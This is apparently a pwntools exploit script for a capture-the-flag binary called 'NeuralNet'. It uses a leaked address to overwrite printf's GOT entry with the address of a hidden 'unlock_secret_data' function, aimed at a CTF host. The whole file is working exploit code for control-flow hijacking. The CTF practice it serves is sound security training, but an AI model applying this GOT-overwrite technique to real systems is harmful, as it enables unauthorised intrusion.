#!/usr/bin/env python3
from pwn import *

elf = ELF("./NeuralNet")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break *main+445
'''

domain= "ctf.mf.grsu.by"
port = 9076

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================
r.recvuntil('_outcome): ')
leak = int(r.recvline().strip(), 16)
printf_got_addr = leak + 0x2e1e + 0x10
unlock_secret_addr = leak - 0x59

log.info(f"Leak address: {hex(leak)}")
log.info(f"printf@GOT: {hex(printf_got_addr)}")
log.info(f"unlock_secret_data:{hex(unlock_secret_addr)}")

r.sendline(b"3")
r.sendline(hex(printf_got_addr).encode())
r.sendline(hex(unlock_secret_addr).encode())

r.sendline(b"2")

r.interactive()
